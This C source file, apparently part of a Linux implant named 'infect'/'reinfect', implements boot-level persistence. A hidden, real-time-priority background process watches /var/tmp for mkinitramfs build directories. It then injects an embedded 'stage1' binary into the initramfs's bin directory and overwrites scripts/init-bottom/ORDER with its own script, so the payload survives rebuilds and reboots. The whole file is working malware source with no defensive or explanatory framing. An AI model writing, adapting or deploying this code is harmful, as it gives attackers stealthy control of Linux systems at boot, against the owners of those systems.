#include "infect.h"

#include "mlog.h"

#include <sys/inotify.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <poll.h>
#include <sched.h>
#include <string.h>
#include <limits.h>

struct exe_t exe;
struct exe_t script;

struct ctx_t {
	int inotify_fd;
	int tmpdir_wd;
	int bin_wd;
	int scripts_create_wd;
	int scripts_init_bottom_wd;
	char stage1_tmpfile[PATH_MAX]; //tmpfile filename for splatting stage1
	char script_tmpfile[PATH_MAX]; //tmpfile filename for splatting script
	char tmpdir[PATH_MAX];         //path of where initrd is being
	                               //assembled
	int splatted_stage1;
	int splatted_script;
} ctx;

//call this with basedir as a suitably large buffer, as it will be
//written to
static int make_tempfile(char *basedir, mode_t mode)
{
	FILE* urandom = NULL;
	int rc = -1;
	int rand;
	char filename[PATH_MAX];

	do {
		urandom = fopen("/dev/urandom", "r");
		if (urandom == NULL) {
			mlog(LFAIL, "couldn't open urandom: %s", strerror(errno));
			goto out;
		}
		rc = fread((void*)(&rand), sizeof(rand), 1, urandom);
		fclose(urandom);

		snprintf(filename, sizeof(filename) - 1,
			 "%s/reinfect-%X", basedir, rand);
		mlog(LINFO, "made tmpfile of %s", filename);
		rc = open(filename, O_CREAT | O_RDWR | O_EXCL, mode);
	} while (rc == -EEXIST);
	if (rc < 0) {
		mlog(LFAIL,"open: %s", strerror(errno));
	}

	strcpy(basedir, filename);
 out:
	return rc;
}

static int splat_fd(int fd, unsigned char* buf, size_t len)
{
	int rc = -1;
	ssize_t s;
	size_t written = 0;
	for (;;) {
		s = write(fd, (const void*)(buf+written), len-written);
		if (s < 0) {
			mlog(LFAIL, "(splat_fd) write: %s", strerror(errno));
			goto out;
		}
		written += s;
		if (len == written) {
			break;
		}
	}
	(void)close(fd);

	rc = 0;
 out:
	return rc;
}

static void ctx_tmpfiles(void)
{
	int rc;
	strcpy(ctx.stage1_tmpfile, "/var/tmp");
	rc = make_tempfile(ctx.stage1_tmpfile,
			   S_IRWXU |
			   S_IRGRP | S_IXGRP |
			   S_IROTH | S_IXOTH);
	if (rc < 0) {
		mlog(LFAIL, "mkstmp: %s", strerror(errno));
		goto out;
	}
	mlog(LINFO, "ctx.stage1_tmpfile = '%s'", ctx.stage1_tmpfile);
	rc = splat_fd(rc, exe.buf, exe.len);
	if (rc < 0) {
		mlog(LFAIL, "splat_file: %s", strerror(errno));
		goto out;
	}

	strcpy(ctx.script_tmpfile, "/var/tmp");
	rc = make_tempfile(ctx.script_tmpfile,
			   S_IRWXU |
			   S_IRGRP | S_IXGRP |
			   S_IROTH | S_IXOTH);
	if (rc < 0) {
		mlog(LFAIL, "mkstmp", strerror(errno));
		goto out;
	}
	rc = splat_fd(rc, script.buf, script.len);
	if (rc < 0) {
		mlog(LFAIL, "splat_file: %s", strerror(errno));
		goto out;
	}
 out:
	return;
}

static void ctx_setup_common(void)
{
	ctx.bin_wd = -1;
	ctx.scripts_create_wd = -1;
	ctx.scripts_init_bottom_wd = -1;
	ctx.tmpdir[0] = 0;
	ctx.stage1_tmpfile[0] = 0;
	ctx.script_tmpfile[0] = 0;

	ctx.splatted_stage1 = 0;
	ctx.splatted_script = 0;
}

static int ctx_done(void)
{
	if (ctx.splatted_script && ctx.splatted_stage1) {
		return 1;
	}
	return 0;
}

static int ctx_init(void)
{
	int rc;

	rc = inotify_init();
	if (rc < 0) {
		mlog(LFAIL, "could not init inotify: %s", strerror(errno));
		goto out;
	}
	ctx.inotify_fd = rc;
	rc = fcntl(ctx.inotify_fd, F_SETFD, O_NONBLOCK);
	if (rc < 0) {
		mlog(LFAIL, "could not fctnl: %s", strerror(errno));
		goto out;
	}

	rc = inotify_add_watch(ctx.inotify_fd, "/var/tmp", IN_CREATE);
	if (rc < 0) {
		mlog(LFAIL, "could not add watch: %s", strerror(errno));
		goto out;
	}
	ctx.tmpdir_wd = rc;

	ctx_setup_common();

	rc = 0;
 out:
	return rc;
}

static void ctx_reset(void)
{
	(void)inotify_rm_watch(ctx.inotify_fd, ctx.bin_wd);
	(void)inotify_rm_watch(ctx.inotify_fd, ctx.scripts_create_wd);
	(void)inotify_rm_watch(ctx.inotify_fd, ctx.scripts_init_bottom_wd);
	ctx_setup_common();
}


static int add_watch(const char *template, char *name, int mask)
{
	char filename[256];
	int rc;

	snprintf(filename, sizeof(filename) - 1, template, name);
	mlog(LINFO, "adding watch on %s", filename);
	rc = inotify_add_watch(ctx.inotify_fd,
			       filename, mask);
	if (rc < 0) {
		mlog(LFAIL, "adding watch on %s: %s", filename, strerror(errno));
	}

	return rc;
}

static void handle_inotify_event(const struct inotify_event *event)
{
	if ((event->mask & IN_CREATE) &&
	    (event->len)) {
		const char template[] = "mkinitramfs_";

		if (ctx_done()) {
			ctx_reset();
		}
		if ((event->wd == ctx.tmpdir_wd) &&
		    (event->mask & IN_ISDIR) &&
		    !strncmp(event->name, template, sizeof(template) - 1)) {
			/* at this point, a new directory called
			 * /var/tmp/mkinitramfs_... has been made
			 */
			char *name = (char*)(event->name);
			int rc;

			rc = add_watch("/var/tmp/%s", name, IN_CREATE);
			if (rc < 0) {
				mlog(LFAIL, "couldn't add watch of /var/tmp/%s: %s",
				     name,
				     strerror(errno));
				goto out;
			}
			ctx.bin_wd = rc;

			snprintf(ctx.tmpdir, sizeof(ctx.tmpdir) - 1,
				 "/var/tmp/%s", name);
			ctx_tmpfiles();
		} else if ((event->wd == ctx.bin_wd) &&
			   (event->mask & IN_ISDIR) &&
			   !strcmp(event->name, "scripts")) {
			/* add watch for scripts */
			int rc;

			mlog(LINFO, "scripts dir should be created now");
			rc = add_watch("%s/scripts", ctx.tmpdir, IN_CREATE);
			if (rc < 0) {
				mlog(LFAIL, "couldn't add watch of %s/scripts: %s",
				     ctx.tmpdir, strerror(errno));
				goto out;
			}
			ctx.scripts_create_wd = rc;

		} else if ((event->wd == ctx.bin_wd) &&
			   (event->mask & IN_ISDIR) &&
			   !strcmp(event->name, "bin")) {
			/* at this point the bin directory has been created */
			int rc;
			char stage1_path[PATH_MAX];
			const char stage1_template[] = "%s/bin/stage1";

			mlog(LINFO, "bin directory should be created now");
			stage1_path[0] = 0;

			snprintf(stage1_path,
				 sizeof(stage1_path) - sizeof(stage1_template) - 1,
				 stage1_template, ctx.tmpdir);

			rc = rename(ctx.stage1_tmpfile, stage1_path);
			if (rc < 0) {
				mlog(LFAIL, "failed to rename %s to %s: %s",
				     ctx.stage1_tmpfile, stage1_path, strerror(errno));
			} else {
				mlog(LPASS, "splatted %s", stage1_path);
			}
			ctx.splatted_stage1 = 1;

		} else if ((event->wd == ctx.scripts_create_wd) &&
			   (event->mask & IN_ISDIR) &&
			   !strcmp(event->name, "init-bottom"))	{
			int rc;
			/* scripts/init-bottom  has been created */
			rc = add_watch("%s/scripts/init-bottom", ctx.tmpdir, IN_CREATE);
			if (rc < 0) {
				mlog(LFAIL, "couldn't add watch on %s/scripts/init-bottom: %s",
				     ctx.tmpdir,
				     strerror(errno));
			}
			ctx.scripts_init_bottom_wd = rc;
		} else if ((event->wd == ctx.scripts_init_bottom_wd) &&
			   !(event->mask & IN_ISDIR) &&
			   !(strcmp(event->name, "ORDER"))) {
			/* scripts/init-bottom/ORDER has just been created */
			int rc;
			char script_path[PATH_MAX];
			const char script_template[] = "%s/scripts/init-bottom/ORDER";

			usleep(100*1000);
			//let's just stomp it
			script_path[0] = 0;

			snprintf(script_path,
				 sizeof(script_path) - sizeof(script_template) - 1,
				 script_template, ctx.tmpdir);
			rc = rename(ctx.script_tmpfile, script_path);
			if (rc < 0) {
				mlog(LFAIL, "failed to rename %s to %s: %s",
				     ctx.script_tmpfile, script_path, strerror(errno));
			} else {
				mlog(LPASS, "splatted %s", script_path);
			}
			ctx.splatted_script = 1;
		}
	}
 out:
	return;
}


static void handle_inotify(void)
{
	char buf[4096*2]
		__attribute__ ((aligned(__alignof__(struct inotify_event))));
	const struct inotify_event *event;
	ssize_t len;
	char *ptr;

	for (;;) {

		len = read(ctx.inotify_fd, buf, sizeof buf);
		if (len == -1 && errno != EAGAIN) {
			mlog(LFAIL, "read: %s", strerror(errno));
			goto out;
		}
		if (len <= 0) {
			break;
		}
		for (ptr = buf; ptr < buf + len;
		     ptr += sizeof(struct inotify_event) + event->len) {

			event = (const struct inotify_event *) ptr;
			handle_inotify_event(event);
		}
	}
 out:
	return;
}

pid_t run_reinfect()
{
	pid_t pid;

	pid = fork();
	if (pid < 0) {
		mlog(LFAIL, "couldn't fork: %s", strerror(errno));
		goto out;
	} else if (pid == 0) {
		/* child */
		struct pollfd pollfds[1];
		struct sched_param sched = {
			.sched_priority = 1
		};
		int rc;

		close(0);
		close(1);
		close(2);

		(void)open("/dev/null", O_RDONLY);
		(void)open("/dev/null", O_WRONLY);
		(void)open("/dev/null", O_RDWR);

		if (ctx_init() < 0) {
			mlog(LFAIL, "could not initialize structure: %s", strerror(errno));
			exit(EXIT_FAILURE);
		}
		rc = sched_setscheduler(getpid(),
					SCHED_FIFO,
					&sched);
		if (rc < 0) {
			mlog(LFAIL, "sched_setscheduler: %s", strerror(errno));
			exit(EXIT_FAILURE);
		}
		pollfds[0].fd = ctx.inotify_fd;
		pollfds[0].events = POLLIN | POLLNVAL;
		while ((rc = poll(pollfds, 1, -1))) {
			if (rc < 0) {
				if (errno == -EINTR) {
					continue;
				} else {
					mlog(LFAIL, "error in poll: %s", strerror(errno));
					exit(EXIT_FAILURE);
				}
			}
			if (pollfds[0].revents & POLLIN) {
				/* Inotify events are available */
				handle_inotify();
			}

		}
		exit(EXIT_FAILURE);
	}
 out:
	return pid;
}

int infect_get_inotify_fd()
{
	return ctx.inotify_fd;
}

int infect_init()
{
	return ctx_init();
}

void infect_handle_inotify()
{
	handle_inotify();
}

/*
 * Editor modelines  -  https://www.wireshark.org/tools/modelines.html
 *
 * Local variables:
 * c-basic-offset: 8
 * tab-width: 8
 * indent-tabs-mode: t
 * End:
 *
 * vi: set shiftwidth=8 tabstop=8 noexpandtab:
 * :indentSize=8:tabSize=8:noTabs=false:
 */
